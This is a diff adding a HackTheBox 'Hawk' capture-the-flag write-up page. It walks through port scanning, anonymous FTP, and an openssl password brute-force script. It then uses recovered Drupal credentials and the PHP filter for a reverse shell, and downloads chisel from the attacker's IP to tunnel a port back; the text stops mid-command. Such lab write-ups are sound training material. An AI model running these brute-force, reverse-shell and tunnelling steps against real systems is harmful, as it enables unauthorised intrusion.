@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB: Hawk :: The Logan Lab</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Hawk - Write up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/hawk/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB: Hawk">
+<meta property="og:description" content="**HTB | Hawk - Write up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/hawk/" />
+<meta property="og:site_name" content="The Logan Lab" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Hawk.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-11 19:33:45 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    l0gan334&#39;s lab
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/hawk/">HTB: Hawk</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-11
+        
+      </span>
+    
+    
+      <span class="post-author">:: l0gan334</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/htb/">HTB</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/openssl/">OpenSSL</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/drupal/">drupal</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/h2_database/">H2_Database</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/linux/">linux</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Hawk.png"
+    class="post-cover"
+    alt="HTB: Hawk"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Hawk</strong> is an easy HTB machine that offers a cryptography challenge with openssl.</p>
+<p>We will get credentials we can use with the <strong>Drupal</strong> website and from the admin panel we will get us a reverse shell.</p>
+<p>Finally we will abuse a H2 database to get to <strong>root</strong>.</p>
+<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>nmap</strong> discovers some open ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -v -n -Pn 10.129.95.193 -oG allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked up and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-11 19:31 -05
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 19:31
+</span></span><span style="display:flex;"><span>Scanning 10.129.95.193 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 21/tcp on 10.129.95.193
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.129.95.193
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.129.95.193
+</span></span><span style="display:flex;"><span>Discovered open port 9092/tcp on 10.129.95.193
+</span></span><span style="display:flex;"><span>Discovered open port 5435/tcp on 10.129.95.193
+</span></span><span style="display:flex;"><span>Discovered open port 8082/tcp on 10.129.95.193
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 19:31, 14.82s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.193
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.17s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65529</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp   open  ftp
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>5435/tcp open  sceanics
+</span></span><span style="display:flex;"><span>8082/tcp open  blackice-alerts
+</span></span><span style="display:flex;"><span>9092/tcp open  XmlIpcRegSvc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.95 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">72513</span> <span style="color:#f92672">(</span>3.191MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">72513</span> <span style="color:#f92672">(</span>2.901MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We are exporting the result in <strong>grepable format</strong>, which is great to manage with <strong>regex</strong> and get all the ports without needing to type them one by one:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Here you have an useful function you can use for this manner</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-bash" ><code>
+extractPorts () {
+	ports=&#34;$(cat $1 | grep -oP &#39;\d{1,5}/open&#39; | awk &#39;{print $1}&#39; FS=&#39;/&#39; | xargs | tr &#39; &#39; &#39;,&#39;)&#34;
+	ip_address=&#34;$(cat $1 | grep initiated | awk &#39;NF{print $NF}&#39;)&#34;
+	echo -e &#34;\n[*] Extracting information...\n&#34; &gt; extractPorts.tmp
+	echo -e &#34;\t[*] IP Address: $ip_address&#34; &gt;&gt; extractPorts.tmp
+	echo -e &#34;\t[*] Open ports: $ports\n&#34; &gt;&gt; extractPorts.tmp
+	echo $ports | tr -d &#39;\n&#39; | xclip -sel clip
+	echo -e &#34;[*] Ports copied to clipboard\n&#34; &gt;&gt; extractPorts.tmp
+	/bin/batcat extractPorts.tmp
+	rm extractPorts.tmp
+}
+</code></pre>
+  </div>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ extractPorts allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting information...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> IP Address: 10.129.95.193
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Open ports: 21,22,80,5435,8082,9092
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ports copied to clipboard
+</span></span></code></pre></div><p>With nmap parameters <strong>-sCV</strong> we can discover the service and version of each port:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p21,22,80,5435,8082,9092 10.129.95.193 -oN targeted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-11 20:24 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.95.193
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.17s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>21/tcp   open  ftp           vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>| ftp-syst:
+</span></span><span style="display:flex;"><span>|   STAT:
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to ::ffff:10.10.14.161
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> messages
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http          Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
+</span></span><span style="display:flex;"><span>|_http-generator: Drupal <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>http://drupal.org<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">36</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| /includes/ /misc/ /modules/ /profiles/ /scripts/
+</span></span><span style="display:flex;"><span>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+</span></span><span style="display:flex;"><span>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+</span></span><span style="display:flex;"><span>|_/LICENSE.txt /MAINTAINERS.txt
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>5435/tcp open  tcpwrapped
+</span></span><span style="display:flex;"><span>8082/tcp open  http          H2 database http console
+</span></span><span style="display:flex;"><span>|_http-title: H2 Console
+</span></span><span style="display:flex;"><span>9092/tcp open  XmlIpcRegSvc?
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 19.36 seconds
+</span></span></code></pre></div><h1 id="enumeration"><strong><code>Enumeration</code></strong><a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Port 80 hosts a <strong>Drupal 7</strong> instance:</p>
+
+  <img src="/img/haw2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>In the <strong>/CHANGELOG.TXT</strong> we see that it&rsquo;s not using a vulnerable version to the famous <strong>drupalgeddon</strong> so there&rsquo;s not much we can do for now until we have creds.</p>
+
+  <img src="/img/haw3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Port 8082 is a H2 database we cannot access:</p>
+
+  <img src="/img/haw4.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>But let&rsquo;s not forget this because we will for sure be able to access it from inside the victim machine.</p>
+<h1 id="finding-encrypted-file">Finding encrypted file<a href="#finding-encrypted-file" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>There&rsquo;s also port 21 (ftp). Nmap has deployed the script ftp-anon and it shows that the anonymous login is available so we can login as user <strong>anonymous</strong> and no password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ftp 10.129.95.193
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Connected to 10.129.95.193.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.129.95.193:logan<span style="color:#f92672">)</span>: anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Login successful.
+</span></span><span style="display:flex;"><span>Remote system type is UNIX.
+</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span>ftp&gt;
+</span></span></code></pre></div><p>Inside we can find a directory <em>messages</em> with a hidden file inside we can download:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|41160|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> messages
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; cd messages
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Directory successfully changed.
+</span></span><span style="display:flex;"><span>ftp&gt; ls -la
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|46903|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">240</span> Jun <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2018</span> .drupal.txt.enc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; get .drupal.txt.enc
+</span></span><span style="display:flex;"><span>local: .drupal.txt.enc remote: .drupal.txt.enc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|43488|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> .drupal.txt.enc <span style="color:#f92672">(</span><span style="color:#ae81ff">240</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |****************************************************************************************************|   <span style="color:#ae81ff">240</span>        4.97 MiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">240</span> bytes received in 00:00 <span style="color:#f92672">(</span>1.42 KiB/s<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>This turns out to be a openssl encrypted message in base64.</p>
+<h1 id="decrypting-the-file">Decrypting the file<a href="#decrypting-the-file" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>With <strong>openssl</strong> we can bruteforce the password, however there&rsquo;s a variable we don&rsquo;t have, the cipher format.</p>
+<p>We could use a tool like this one which iterates through every possible cipher:
+
+  <img src="/img/haw1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>But this would take too long so first we will go with the most common one: AES-256-CBC.</p>
+<p>This is the script that will do the bruteforce for us:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">decryptor.sh</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-bash" ><code>
+#!/bin/bash
+
+for password in $(cat /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt); do
+  openssl aes-256-cbc -d -a -in .drupal.txt.enc -out drupal.decrypted -pass pass:$password &amp;&gt;/dev/null
+
+  if [ &#34;$(echo $?)&#34; == &#34;0&#34; ]; then
+    echo -e &#34;\n[&#43;] Password: $password&#34;
+    exit 0
+  fi
+done
+</code></pre>
+  </div>
+
+
+<p>Parameters:</p>
+<ul>
+<li><code>-a</code>: base64 encoded content.</li>
+<li><code>-d</code>: decrypt.</li>
+<li><code>-in</code>: input file to decrypt.</li>
+<li><code>-out</code>: file to output the decrypted content.</li>
+<li><code>-pass</code>: password to try.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ./decryptor.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password: friends
+</span></span></code></pre></div><p>The password is <em>friends</em>, and the output of the decrypted message should be in <strong>drupal.decrypted</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat drupal.decrypted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Daniel,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Following the password <span style="color:#66d9ef">for</span> the portal:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PencilKeyboardScanner123
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Please let us know when the portal is ready.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Kind Regards,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>IT department
+</span></span></code></pre></div><h1 id="drupal-access">Drupal access<a href="#drupal-access" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This credentials may be useful with the Drupal website:</p>
+
+  <img src="/img/haw5.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+
+  <img src="/img/haw6.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Nice.</p>
+<h1 id="command-execution">Command execution<a href="#command-execution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>From a Drupal admin panel there&rsquo;s a common way to get command execution by creating an article with php code.</p>
+<p>But first we have to enable the PHP filter inside the Modules:</p>
+
+  <img src="/img/haw7.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Now inside <strong>Content</strong> we can create a new article and write php code to send a reverse shell:</p>
+<p>
+  <img src="/img/haw8.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+
+  <img src="/img/haw9.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+
+  <img src="/img/haw10.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>Now once we save the article we should get the connection to our netcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>Connection from 192.168.10.21:43348
+</span></span><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.95.193.
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.95.193:48998.
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>993<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@hawk:/var/www/html$
+</span></span></code></pre></div><p>Perfect, however, we have a shell not a tty so let&rsquo;s get one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>www-data@hawk:/var/www/html$  script /dev/null -c bash
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>Script started, file is /dev/null
+</span></span><span style="display:flex;"><span>www-data@hawk:/var/www/html$ ^Z
+</span></span><span style="display:flex;"><span>zsh: suspended  nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ stty raw -echo; fg
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + continued  nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>                              reset xterm
+</span></span></code></pre></div><p>And lastly some final touches like the screen size (you can get yours doing <code>stty size</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@hawk:/var/www/html$ export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>www-data@hawk:/var/www/html$ export SHELL<span style="color:#f92672">=</span>bash
+</span></span><span style="display:flex;"><span>www-data@hawk:/var/www/html$ stty rows <span style="color:#ae81ff">40</span> columns <span style="color:#ae81ff">145</span>
+</span></span></code></pre></div><p>Inside daniel&rsquo;s home directory we can see the user flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@hawk:/home/daniel$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>www-data@hawk:/home/daniel$ cat user.txt
+</span></span><span style="display:flex;"><span>17f10ee16b5094******************
+</span></span></code></pre></div><p>Now let&rsquo;s work our way to the <strong>root.txt</strong>:</p>
+<h1 id="privesc"><strong><code>Privesc</code></strong><a href="#privesc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Now that we are inside the machine we can access the H2 database:
+
+  <img src="/img/haw11.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<h1 id="port-forwarding">Port forwarding<a href="#port-forwarding" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>With chisel we can forward port 8082 and access this port as if we were the victim machine itself:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@hawk:/tmp$ wget http://10.10.14.161/chisel
+</span></span><span style="display:flex;"><span>--2022-07-12 02:29:07--  http://10.10.14.161/chisel
+</span></span><span style="display:flex;"><span>Connecting to 10.10.14.161:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">3107968</span> <span style="color:#f92672">(</span>3.0M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: <span style="color:#e6db74">&#39;chisel&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chisel                               100%<span style="color:#f92672">[===================================================================</span>&gt;<span style="color:#f92672">]</span>   2.96M  1.24MB/s    in 2.4s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022-07-12 02:29:09 <span style="color:#f92672">(</span>1.24 MB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;chisel&#39;</span> saved <span style="color:#f92672">[</span>3107968/3107968<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>www-data@hawk:/tmp$ chmod +x chisel
+</span></span></code></pre></div><p>Chisel works by setting a server in our host and a client in the victim machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@hawk:/tmp$ ./chisel client 10.10.14.161:1234 R:8082:127.0.0.1:8082
+</span></span><span style="display:flex;"><span>2022/07/12 02:32:20 client: Connecting to ws://10.10.14.161:1234
+</span></span><span style="display:flex;"><span>2022/07/12 02:32:21 client: Connected <span style="color:#f92672">(</span>Latency 181.20864ms<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ ./chiselarm server --reverse -p <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>
